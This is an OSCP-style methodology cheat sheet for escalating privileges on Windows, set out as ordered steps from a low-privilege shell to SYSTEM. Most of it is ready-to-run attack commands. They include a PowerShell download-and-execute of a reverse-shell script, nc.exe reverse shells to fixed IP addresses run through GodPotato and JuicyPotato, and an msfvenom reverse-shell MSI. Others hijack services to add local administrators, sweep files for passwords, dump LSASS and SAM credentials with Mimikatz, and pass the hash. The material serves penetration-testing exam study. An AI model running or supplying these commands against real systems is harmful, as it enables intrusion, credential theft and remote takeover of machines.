# Windows Privilege Escalation — OSCP Methodology

Execution-ordered, from landing a low-priv shell to root/SYSTEM. Run automated enum first, then manually verify every finding before exploiting (OSCP grading wants documented reasoning, not just a shell pop).

**Exam note:** WinPEAS/PowerUp/Seatbelt for _enumeration_ are fine. Manual exploitation is expected — Metasploit is capped at one target for the whole exam (msfvenom/searchsploit don't count), so save it if you plan to use it elsewhere. Mimikatz is allowed.

```sh
- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes
```

---

## 0. Stabilize & Orient

```powershell
whoami /all
hostname
systeminfo
wmic qfe list full            # patch level — cross-ref with Watson/Sherlock
echo %PROCESSOR_ARCHITECTURE%
netstat -ano
```

Get a proper shell first if you're on a raw reverse shell:

```powershell
# Upgrade netcat shell -> add a stable listener via nc.exe, or pivot to evil-winrm if creds found later
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-PowerShellTcp.ps1')"
```

---

## 1. Automated Enumeration Sweep

Run these in parallel, then manually verify every hit — don't trust the tool's "found!" without confirming exploitability.

```powershell
# WinPEAS (most thorough, noisy)
.\winPEASx64.exe quiet servicesinfo filesinfo > winpeas_out.txt

# PrivescCheck
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

**Decision point:** cross-reference `systeminfo` patch level against Watson output before trusting a suggested kernel exploit — false positives are common.

---

## 2. User & Privilege Enumeration

```powershell
whoami /priv
whoami /groups
net user %username%
net user
net localgroup administrators
```

|Privilege in `whoami /priv`|Technique|
|---|---|
|`SeImpersonatePrivilege` / `SeAssignPrimaryTokenPrivilege`|PrintSpoofer / GodPotato / RoguePotato / JuicyPotatoNG|
|`SeBackupPrivilege`|Read SAM/SYSTEM hives directly, or copy any file regardless of ACL|
|`SeRestorePrivilege`|Overwrite arbitrary system files (e.g. replace a service binary)|
|`SeTakeOwnershipPrivilege`|Take ownership of any file/service, then repoint it|
|`SeLoadDriverPrivilege`|Load vulnerable kernel driver for LPE|
|`SeDebugPrivilege`|Dump LSASS with any tool (mimikatz, procdump, task manager)|

**Decision point (SeImpersonate found — most common OSCP win):**

```powershell
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# PrintSpoofer (best first try)
.\PrintSpoofer64.exe -i -c cmd

# GodPotato (works on newer builds where PrintSpoofer fails)
.\GodPotato-NET4.exe -cmd "cmd /c whoami"

.\GodPotato-NET4.exe -cmd "C:\users\public\nc.exe -e cmd.exe 172.16.7.240 444"

# RoguePotato (needs external redirector)
.\RoguePotato.exe -r <ATTACKER_IP> -e "cmd.exe /c whoami" -l 9999
```

**Juicy Potato:**

```sh
reg query HKCR\CLSID /s /f LocalService
```

```sh
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\Users\Public\nc.exe 10.10.15.34 8443 -e cmd.exe" -t * -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}"
```

---

## 3. Service Misconfigurations

```powershell
# List services and their binary paths
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\"

# Weak service permissions (can we reconfigure/start/stop a service?)
accesschk.exe /accepteula -uwcqv <username> *
.\PowerUp.ps1; Get-ServiceUnquoted -Verbose      # unquoted service paths
.\PowerUp.ps1; Get-ModifiablePath -Verbose        # weak folder/file perms
.\PowerUp.ps1; Get-ServiceEXEPerms                # weak binary perms
.\PowerUp.ps1; Get-ServicePermission             # weak service config perms
```

**Decision point — map finding to exploit:**

|Finding|Exploit|
|---|---|
|Unquoted service path with space (`C:\Program Files\My App\svc.exe`) and writable parent dir|Drop `C:\Program.exe` or `C:\Program Files\My.exe`, restart service|
|We can modify the service binary itself|Replace with malicious binary/reverse shell, restart service|
|We can reconfigure the service (`sc config`) via weak ACL|`sc config <svc> binpath= "cmd /c net localgroup administrators <user> /add"`|
|Service runs as SYSTEM and auto-restarts / we can restart it|Any of the above, then `net start <svc>` (or wait for reboot / `sc stop`+`sc start`)|

```powershell
# Actually taking over a service
sc.exe config <SERVICE> binpath= "C:\temp\shell.exe"
sc.exe stop <SERVICE>
sc.exe start <SERVICE>
```

---

## 4. Registry & AlwaysInstallElevated

```powershell
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
reg query "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
```

**Decision point:** if both keys return `0x1` →

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o shell.msi
```

```powershell
msiexec /quiet /qn /i C:\temp\shell.msi
```

---

## 5. Scheduled Tasks / Startup Apps

```powershell
schtasks /query /fo LIST /v
# Look for tasks running as SYSTEM/Admin pointing to a file you can write to
icacls "C:\path\to\task\binary.exe"
```

**Decision point:** if the target binary/script of a SYSTEM-run task is writable → overwrite it with a payload, wait for/trigger the task.

---

## 6. Weak File/Folder Permissions & Credential Hunting

```powershell
# Broad recursive sweep of interesting files
findstr /si password *.txt *.ini *.xml *.config *.cfg 2>nul
findstr /spin "password" *.*
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

# Unattended install / sysprep leftovers (classic)
dir /s /b C:\Windows\Panther\Unattend.xml
dir /s /b C:\Windows\Panther\Unattended.xml
type C:\Windows\Panther\Unattend.xml 2>nul

# PowerShell history
type $Env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Saved RDP/WinSCP/PuTTY creds, SAM/SYSTEM backups
dir /s /b *.rdp *.vnc *config.xml*
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" 
Get-ChildItem -Path C:\ -Include *password*,*.kdbx,web.config -File -Recurse -ErrorAction SilentlyContinue

# web.config / IIS connection strings
findstr /si connectionstring C:\inetpub\wwwroot\*.config
```

**Decision point:** SAM/SYSTEM hives found (e.g. under `C:\Windows\repair\` or a backup) →

```bash
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

---

## 7. Credential Dumping (SeDebugPrivilege / local admin already)

```powershell
# Mimikatz — allowed on OSCP
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
token::elevate

# LSASS dump for offline parsing if binary blocked
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
# then on attacker box:
pypykatz lsa minidump lsass.dmp | tee lsass.out
# then grep usernames
grep NT lsass.out -B3 | grep -i username
# Netexec pth
nxc smb <IP> -u Administrator -H <hash>
```

---

## 8. DLL Hijacking / PATH Abuse

```powershell
# Find services/apps loading DLLs from writable, non-standard paths
Get-Process | ForEach-Object { $_.Modules } | Sort-Object -Unique FileName
accesschk.exe /accepteula -dqv "C:\Program Files\<App>"
```

**Decision point:** writable install directory + missing DLL referenced by a SYSTEM-run process → drop malicious DLL with matching export, restart process/service.

```powershell
# PowerUp helper
.\PowerUp.ps1; Find-PathDLLHijack
Write-HijackDll -DllPath "C:\path\to.dll" -Command "net localgroup administrators <user> /add"
```

---

## 9. Token Impersonation (already covered under §2, expanded)

```powershell
# If SeImpersonate fails, check for existing high-priv tokens to steal
.\Incognito.exe list_tokens -u
.\Incognito.exe impersonate_token "NT AUTHORITY\SYSTEM"
```

---

## 10. Kernel Exploits (last resort — noisy, can crash the box)

```powershell
systeminfo                     # get exact build/patch level
.\Watson.exe                   # or Sherlock.ps1 — match to known CVE
```

Then compile/transfer matching PoC (e.g. CVE-2021-1732, CVE-2020-0796/SMBGhost, PrintNightmare CVE-2021-1675/34527 if spooler exposed). Test on a snapshot/local VM copy of the same patch level first if at all possible — exam grading favors clean manual paths, so treat this as the fallback, not the default.

---

## Priority Fast-Path (try in this order first)

1. **`whoami /priv` → SeImpersonatePrivilege → PrintSpoofer/GodPotato** — by far the most common OSCP Windows privesc.
2. **WinPEAS/PrivescCheck**
3. **AlwaysInstallElevated** registry check — quick, binary yes/no.
4. **Scheduled tasks pointing to writable binaries.**
5. **Credential sweep** (Unattend.xml, PS history, web.config, saved RDP/PuTTY) — often chains into a completely different (easier) vector, including lateral movement.
6. **Mimikatz** if already local admin and need to pivot/dump domain creds.
7. **Kernel exploit** only if everything above is exhausted and patch level clearly supports one.

---

Document _why_ each command was run — which enumeration output justified it — for every step you take on the real exam; OSCP reports are graded on that reasoning, not just proof.txt.

# OffSec Cheatsheet

## Installed Applications

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

## Running Processes

```powershell
Get-Process
```